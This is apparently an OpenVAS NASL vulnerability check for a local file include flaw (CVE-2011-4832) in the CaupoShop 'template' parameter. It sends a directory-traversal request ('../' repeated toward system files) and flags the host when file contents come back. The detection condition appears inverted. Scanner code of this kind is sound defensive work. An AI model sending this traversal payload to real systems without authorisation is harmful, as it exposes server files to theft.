###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cauposhop_50530.nasl 5648 2017-03-21 09:52:17Z cfi $
#
# CaupoShop 'template' Parameter Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "CaupoShop is prone to a local file-include vulnerability because it
fails to sufficiently sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and execute arbitrary local scripts in the
context of the Web server process. This may allow the attacker
to compromise the application and computer; other attacks are
also possible.";


if (description)
{
 script_id(103335);
 script_bugtraq_id(50530);
 script_cve_id("CVE-2011-4832");
 script_version ("$Revision: 5648 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("CaupoShop 'template' Parameter Local File Include Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50530");
 script_xref(name : "URL" , value : "http://www.caupo.com");
 script_xref(name : "URL" , value : "http://www.caupo.net/de/shopsysteme/csp/");

 script_tag(name:"last_modification", value:"$Date: 2017-03-21 10:52:17 +0100 (Tue, 21 Mar 2017) $");
 script_tag(name:"creation_date", value:"2011-11-07 10:54:56 +0100 (Mon, 07 Nov 2011)");
 script_tag(name:"qod_type", value:"remote_vul");
 script_summary("Determine if CaupoShop is prone to a local file-include vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/shop",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/index.php"); 
  req = http_get(item:url, port:port);
  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if(!"cauposhop" >< tolower(result)) {

    files = traversal_files();

    foreach file (keys(files)) {

      url = string(dir,"/index.php?action=template&template=",crap(data:"../",length:6*9),files[file]);

      if(http_vuln_check(port:port, url:url,pattern:file)) {
     
        security_message(port:port);
        exit(0);

      }
    }
  }

}

exit(0);
